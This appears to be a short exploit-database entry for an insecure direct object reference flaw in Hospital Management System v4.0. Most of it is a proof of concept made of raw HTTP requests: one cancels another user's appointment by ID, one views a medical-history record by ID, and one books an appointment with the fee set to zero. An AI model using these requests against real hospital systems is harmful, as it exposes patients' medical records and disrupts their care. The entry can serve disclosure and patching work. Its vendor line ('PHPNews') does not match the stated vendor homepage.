# Exploit Title: Hospital Management System v4.0 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://phpgurukul.com/hospital-management-system-in-php
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHPNews
## Version: v4.0
## Exploit Description:
## Hospital Management System v4.0 suffers from IDOR - Broken Access Control Vulnerability allowing attacker user to cancel the appointment that is booked by other user(horizontal privilege escalation).

## -----------------------------------------------POC-------------------------------------------------------------------
```
GET /hospital/hms/appointment-history.php?id=6&cancel=update HTTP/1.1
...
```

GET /hospital/hms/view-medhistory.php?viewid=3 HTTP/1.1




POST /hospital/hms/book-appointment.php HTTP/1.1
...

Doctorspecialization=Orthopedics&doctor=4&fees=0&appdate=2023-12-30&apptime=9%3A00+PM&submit=





